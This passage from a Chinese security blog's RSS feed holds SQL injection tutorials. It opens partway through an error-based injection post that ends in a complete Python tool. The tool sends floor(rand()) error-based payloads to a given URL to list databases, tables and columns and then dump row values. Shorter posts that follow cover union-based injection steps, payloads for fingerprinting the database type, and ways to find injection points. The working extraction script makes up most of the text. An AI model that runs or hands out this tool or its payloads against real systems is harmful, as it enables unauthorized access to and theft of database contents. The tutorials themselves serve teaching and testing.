  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_db_num.png&#34; alt=&#34;报错得到数据库个数&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到数据库名:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到数据库名&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_db_name.png&#34; alt=&#34;报错得到数据库名&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到表名:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到表名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_table_num.png&#34; alt=&#34;报错得到表的个数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_table_name.png&#34; alt=&#34;报错得到表名&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到列名:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到列名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_num.png&#34; alt=&#34;报错得到列的个数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_name1.png&#34; alt=&#34;报错得到列名1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_name2.png&#34; alt=&#34;报错得到列名2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到列值:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;得到列值&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_value_num.png&#34; alt=&#34;报错得到数据条数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_value.png&#34; alt=&#34;报错得到列的值&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附上利用代码:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x04 附上利用代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-  

import re
import urllib
import urllib2
import binascii
from pyfiglet import figlet_format
from optparse import OptionParser


# --dbs url
def getAllDatabases(url):
    # print url
    payload = &amp;quot;&#39; and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot;
    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
    dbs_num_url = url + payload
    # print dbs_num_url
    response = urllib2.urlopen(dbs_num_url)
    html = response.read()
    # print html
    # ~~:~~5~~:~~
    dbs_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;, html).group(1))
    print &amp;quot;database num: %d&amp;quot; % dbs_num
    print &amp;quot;database name: &amp;quot;
    for index in xrange(0,dbs_num):
        payload = &amp;quot;&#39; and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % index
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        db_name_url = url + payload
        response = urllib2.urlopen(db_name_url)
        html = response.read()
        db_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;, html).group(1)
        print &amp;quot;\t%s&amp;quot; % db_name

def getCurrentDb(url):
    # print &amp;quot;CurrentDb is: aaaa&amp;quot;
    # print url

    current_db_name_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot;
    response = urllib2.urlopen(current_db_name_url)
    html = response.read()
    current_db_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;, html).group(1)
    print &amp;quot;Current database is: %s&amp;quot; % current_db_name

def getCurrentUser(url):
    db_name_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot;
    response = urllib2.urlopen(db_name_url)
    html = response.read()
    user_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;, html).group(1)
    print &amp;quot;Current user is: %s&amp;quot; % user_name

# --tables -D database url
def getAllTablesByDb(url,db_name):
    # print db_name
    # print url
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print db_name_hex
    tables_num_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot; % db_name_hex
    response = urllib2.urlopen(tables_num_url)
    html = response.read()
    # print html
    tables_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;, html).group(1))
    # print tables_num
    print &amp;quot;%s has %d table&amp;quot; % (db_name, tables_num)
    print &amp;quot;table name: &amp;quot;
    for index in xrange(0,tables_num):
        tables_name_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s/**/limit/**/%d,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot; % (db_name_hex, index)
        response = urllib2.urlopen(tables_name_url)
        html = response.read()
        # print html
        table_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;,html).group(1)
        print &amp;quot;\t%s&amp;quot; % table_name

def getAllColumnsByTable(url,table_name,db_name):
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    table_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(table_name)
    payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (table_name_hex,db_name_hex)
    # print payload
    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
    column_num_url = url + payload
    response = urllib2.urlopen(column_num_url)
    html = response.read()
    column_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;,html).group(1))
    # print column_num
    print &amp;quot;Table %s of the %s has %d columns&amp;quot; % (table_name,db_name,column_num)
    print &amp;quot;Table %s contains the column name:&amp;quot; % table_name
    for index in xrange(0,column_num):
        payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (table_name_hex,db_name_hex,index)
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        # print payload
        column_value_url = url + payload
        response = urllib2.urlopen(column_value_url)
        html = response.read()
        # print html
        column_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;,html).group(1)
        print &amp;quot;\t%s&amp;quot; % column_name


def getAllcontent(url,column_name,table_name,db_name):
    # print url
    # print column_name
    # print table_name
    # print db_name
    column_name = column_name.split(&#39;,&#39;)
    num_column = len(column_name) #想得到的字段的个数
    # print column_name
    # print num_column

    payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (db_name,table_name)
    # print payload
    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
    column_value_url = url + payload
    response = urllib2.urlopen(column_value_url)
    html = response.read()
    # print html
    column_value_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;,html).group(1))
    print &amp;quot;Table %s has %d columns&amp;quot; % (table_name,column_value_num)
    print &amp;quot;Table %s column values:&amp;quot; % table_name

    title = &amp;quot;\t&amp;quot;
    str_value = &amp;quot;0x7e7e3a7e7e,&amp;quot;
    for x in xrange(0,num_column):
        title += &amp;quot;%-15s&amp;quot; % column_name[x]
        str_value += &amp;quot;%s,0x20,&amp;quot; % column_name[x]
    str_value = &amp;quot;,&amp;quot;.join(str_value.split(&#39;,&#39;)[0:-2]) +&amp;quot;,0x7e7e3a7e7e&amp;quot;
    # print str_value
    
    print title
    for index in xrange(0,column_value_num):
        payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(%s) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (str_value,db_name,table_name,index)
        # print payload
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        value_url = url + payload
        response = urllib2.urlopen(value_url)
        html = response.read()
        # print html
        value = re.search(r&#39;~~:~~(.*?)~~:~~&#39;,html).group(1).split()
        # print value
        stri = &amp;quot;\t&amp;quot;
        # print len(value)
        if len(value)==0:
            print &amp;quot;&amp;quot;
        else:
            for x in xrange(0,num_column):
                stri += &amp;quot;%-15s&amp;quot; % value[x]
            print stri

def main():
    print figlet_format(&amp;quot;sqli-error&amp;quot;)
    parser = OptionParser()
    parser.add_option(&amp;quot;-u&amp;quot;,&amp;quot;--URL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;url&amp;quot;,
              help=&amp;quot;get url&amp;quot;)
    parser.add_option(&amp;quot;-D&amp;quot;,&amp;quot;--DB&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;db_name&amp;quot;,
              help=&amp;quot;get database name&amp;quot;)
    parser.add_option(&amp;quot;-T&amp;quot;,&amp;quot;--TBL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;table_name&amp;quot;,
              help=&amp;quot;get table name&amp;quot;)
    parser.add_option(&amp;quot;-C&amp;quot;,&amp;quot;--COL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;column_name&amp;quot;,
              help=&amp;quot;get column name&amp;quot;)

    parser.add_option(&amp;quot;--dbs&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dbs&amp;quot;,help=&amp;quot;get all database name&amp;quot;)
    parser.add_option(&amp;quot;--current-db&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_db&amp;quot;,help=&amp;quot;get current database name&amp;quot;)
    parser.add_option(&amp;quot;--current-user&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_user&amp;quot;,help=&amp;quot;get current user name&amp;quot;)
    parser.add_option(&amp;quot;--tables&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;tables&amp;quot;,help=&amp;quot;get tables from databases&amp;quot;)
    parser.add_option(&amp;quot;--columns&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;columns&amp;quot;,help=&amp;quot;get columns from tables&amp;quot;)
    parser.add_option(&amp;quot;--dump&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dump&amp;quot;,help=&amp;quot;get value&amp;quot;)
    (options,args) = parser.parse_args()


    if options == None or options.url == None:
        parser.print_help()
    elif options.dump and options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.current_db:
        getCurrentDb(options.url)
    elif options.current_user:
        getCurrentUser(options.url)
    elif options.url:
        print &amp;quot;you input: sqli-error.py -u www.xxx.com/?id=xx&amp;quot;


if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/</guid>
      <description>

&lt;h3 id=&#34;0x00-前提:2676668c0906bb816e5851723ff573bb&#34;&gt;0x00 前提&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;要用联合查询进行注入则：页面必须有显示位
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-联合查询:2676668c0906bb816e5851723ff573bb&#34;&gt;0x01 联合查询&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;union可合并两个或多个select语句的结果集，
前提是两个select必有相同列、且各列的数据类型也相同
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-注入步骤:2676668c0906bb816e5851723ff573bb&#34;&gt;0x02 注入步骤&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;找注入点且得到闭合字符&lt;/li&gt;
&lt;li&gt;判断数据库类型&lt;/li&gt;
&lt;li&gt;猜解列数，得到显示位&lt;/li&gt;
&lt;li&gt;得到基本信息(如：数据库名、数据库版本、当前数据库名等)&lt;/li&gt;
&lt;li&gt;得到数据库名&lt;/li&gt;
&lt;li&gt;得到表名&lt;/li&gt;
&lt;li&gt;得到列名&lt;/li&gt;
&lt;li&gt;得到列值&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;1-找到注入点得到闭合字符:2676668c0906bb816e5851723ff573bb&#34;&gt;1. 找到注入点得到闭合字符&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_closed_character.png&#34; alt=&#34;找到注入点得到闭合字符&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_check_closed_character.png&#34; alt=&#34;确认闭合字符&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;2-判断数据库类型:2676668c0906bb816e5851723ff573bb&#34;&gt;2. 判断数据库类型&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_type_of_db.png&#34; alt=&#34;判断数据库类型&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;3-猜解列数-得到显示位:2676668c0906bb816e5851723ff573bb&#34;&gt;3. 猜解列数，得到显示位&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_order_by.png&#34; alt=&#34;猜解列数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_display_point.png&#34; alt=&#34;得到显示位&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;4-得到基本信息-数据库名-版本-数据库版本等:2676668c0906bb816e5851723ff573bb&#34;&gt;4. 得到基本信息(数据库名、版本、数据库版本等)&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_base_msg.png&#34; alt=&#34;得到基础信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;5-得到数据库:2676668c0906bb816e5851723ff573bb&#34;&gt;5. 得到数据库&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_db_num.png&#34; alt=&#34;得到数据库个数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_db_name.png&#34; alt=&#34;得到数据库名&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;6-得到security数据库的表名:2676668c0906bb816e5851723ff573bb&#34;&gt;6. 得到security数据库的表名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_table_name.png&#34; alt=&#34;得到security数据库的表名&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;7-猜解列名:2676668c0906bb816e5851723ff573bb&#34;&gt;7. 猜解列名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_column_name.png&#34; alt=&#34;得到表列名&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;8-猜解数据:2676668c0906bb816e5851723ff573bb&#34;&gt;8. 猜解数据&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli1_get_column_value.png&#34; alt=&#34;同时得到用户名和密码&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>SQL注入之判断数据库类型</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Sun, 19 Jun 2016 22:15:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/</guid>
      <description>

&lt;h3 id=&#34;0x01-扫描端口:229dd86888239a2888195c125e6a18c9&#34;&gt;0x01 扫描端口&lt;/h3&gt;

&lt;h3 id=&#34;0x02-指纹信息:229dd86888239a2888195c125e6a18c9&#34;&gt;0x02 指纹信息&lt;/h3&gt;

&lt;h3 id=&#34;0x03-在url后面直接判断:229dd86888239a2888195c125e6a18c9&#34;&gt;0x03 在URL后面直接判断&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;Access:
    and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access
    and exists(select count(*) from 表)
SQLserver:
    and (select count(*) from sysobjects) &amp;gt;0 返回正常说明是mssql
MySQL:
    and length(user())&amp;gt;0    返回正常说明是MySQL
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-其他方法:229dd86888239a2888195c125e6a18c9&#34;&gt;0x04 其他方法&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;在mssql中可以调用substring。oracle则只可调用substr
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Sun, 19 Jun 2016 19:40:25 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-含义:4471fc5b6f982d4a6a57280814334d65&#34;&gt;0x00 含义&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;sql注入是将代码插入(拼接)到应用(用户)的输入参数中，
之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-成因:4471fc5b6f982d4a6a57280814334d65&#34;&gt;0x01 成因&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;SQl语句未对用户参数进行严格过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-可引发注入的地方:4471fc5b6f982d4a6a57280814334d65&#34;&gt;0x02 可引发注入的地方&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入
常见的如下，按出现频率排序：
1. GET
2. POST
3. X-Forwarded-For
4. Cookie
5. User-Agent
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-注入分类:4471fc5b6f982d4a6a57280814334d65&#34;&gt;0x03 注入分类&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;根据语法(较权威)：
1. 可联合查询注入:
    只要页面有显示位即可使用，且注入速度很快
2. 报错型注入:
    没有显示位但用echo &amp;quot;mysql_error()&amp;quot;输出了错误信息，速度很快，但是语句较复杂
3. 布尔型注入:
    一次一个字节，速度慢，但只要有注入就能用
4. 基于时间延迟注入:
    超级慢，比布尔型注入慢几倍，但是通用性较强
5. 可多语句查询:
    只有SQL Server可以使用

根据类型：
1. 整形
2. 字符串型
3. 搜索型
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-查找注入点:4471fc5b6f982d4a6a57280814334d65&#34;&gt;0x04 查找注入点&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;在URL中：
1. and 1=1/and 1=2(整型)
2. 随即输入(整型)
3. -1/+1 回显上下页面(整型)
4. 单引号(字符型/整型)
5. and sleep(5) (判断页面返回时间)

在http头：
1. X-Forwarded-For
2. Cookie
3. User-Agent
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>